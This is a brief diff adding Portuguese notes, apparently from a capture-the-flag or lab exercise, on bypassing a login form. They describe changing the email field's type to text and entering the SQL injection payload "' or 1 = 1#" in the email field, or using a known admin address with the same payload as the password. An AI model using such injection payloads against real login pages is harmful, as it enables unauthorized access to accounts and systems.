@@ -1,0 +1,8 @@
+ >> trocar o type do input de email para text
+ >> email: "' or 1 = 1#
+ >> password: não importa
+ 
+ >> pela password
+ >> sabemos o email pq ele é-nos dado no blog
+ >> email: admin@integratingsolutions.net
+ >> password: "' or 1 = 1#
